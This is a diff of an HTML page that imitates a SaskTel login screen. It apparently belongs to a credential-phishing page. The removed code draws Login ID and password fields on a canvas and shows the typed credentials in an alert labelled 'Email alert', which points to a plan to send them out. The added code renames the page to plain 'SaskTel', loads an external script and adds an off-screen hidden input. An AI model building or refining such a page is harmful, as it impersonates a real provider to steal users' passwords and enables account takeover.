@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>SaskTel Canvas Login</title>
+  <meta charset="UTF-8" />
+  <title>SaskTel</title>
   <style>
-    body {
+    body, html {
       margin: 0;
       overflow: hidden;
     }
@@ -13,138 +14,8 @@
   </style>
 </head>
 <body>
-<canvas id="canvas" width="720" height="1402"></canvas>
-
-<script>
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
-
-// Background image
-const bgImage = new Image();
-bgImage.src = "background.png"; // Make sure background.png is in the same directory
-
-// Input fields data
-const inputs = [
-  {
-    label: "Login ID",
-    x: 30,
-    y: 300,
-    width: 660,
-    height: 60,
-    value: '',
-    focused: false,
-    type: 'text'
-  },
-  {
-    label: "Password",
-    x: 30,
-    y: 400,
-    width: 660,
-    height: 60,
-    value: '',
-    focused: false,
-    type: 'password'
-  }
-];
-
-// Button data
-const loginButton = {
-  x: 30,
-  y: 510,
-  width: 660,
-  height: 60,
-  label: "LOG IN"
-};
-
-// Track current input focus
-let currentInputIndex = -1;
-
-// Draw everything
-function draw() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  ctx.drawImage(bgImage, 0, 0, canvas.width, canvas.height);
-
-  // Draw input boxes
-  inputs.forEach((input, i) => {
-    ctx.fillStyle = "white";
-    ctx.fillRect(input.x, input.y, input.width, input.height);
-
-    ctx.lineWidth = 2;
-    ctx.strokeStyle = input.focused ? "#0000ff" : "#ccc";
-    ctx.strokeRect(input.x, input.y, input.width, input.height);
-
-    ctx.font = "20px Arial";
-    ctx.fillStyle = "#aaa";
-    ctx.fillText(input.label, input.x + 10, input.y - 10);
-
-    ctx.fillStyle = "black";
-    const text = input.type === 'password' ? '*'.repeat(input.value.length) : input.value;
-    ctx.fillText(text, input.x + 10, input.y + 40);
-  });
-
-  // Draw login button
-  ctx.fillStyle = "#e5007d";
-  ctx.fillRect(loginButton.x, loginButton.y, loginButton.width, loginButton.height);
-
-  ctx.fillStyle = "white";
-  ctx.font = "22px Arial";
-  ctx.textAlign = "center";
-  ctx.fillText(loginButton.label, loginButton.x + loginButton.width / 2, loginButton.y + 38);
-
-  ctx.textAlign = "start"; // reset
-}
-
-// Handle mouse click
-canvas.addEventListener("mousedown", (e) => {
-  const rect = canvas.getBoundingClientRect();
-  const mouseX = e.clientX - rect.left;
-  const mouseY = e.clientY - rect.top;
-
-  currentInputIndex = -1;
-
-  // Check if click is inside any input
-  inputs.forEach((input, index) => {
-    if (
-      mouseX > input.x &&
-      mouseX < input.x + input.width &&
-      mouseY > input.y &&
-      mouseY < input.y + input.height
-    ) {
-      currentInputIndex = index;
-    }
-    input.focused = index === currentInputIndex;
-  });
-
-  // Check if login button clicked
-  if (
-    mouseX > loginButton.x &&
-    mouseX < loginButton.x + loginButton.width &&
-    mouseY > loginButton.y &&
-    mouseY < loginButton.y + loginButton.height
-  ) {
-    alert(`Email alert: \nLogin ID: ${inputs[0].value}\nPassword: ${inputs[1].value}`);
-  }
-
-  draw();
-});
-
-// Handle keyboard typing
-document.addEventListener("keydown", (e) => {
-  if (currentInputIndex === -1) return;
-
-  const input = inputs[currentInputIndex];
-  if (e.key === "Backspace") {
-    input.value = input.value.slice(0, -1);
-  } else if (e.key.length === 1) {
-    input.value += e.key;
-  }
-  draw();
-});
-
-// Load background and then draw UI
-bgImage.onload = () => {
-  draw();
-};
-</script>
+  <canvas id="canvas"></canvas>
+  <script src="canvas-script.js"></script>
+  <input id="hiddenInput" type="text" style="position: absolute; top: -1000px;" />
 </body>
 </html>
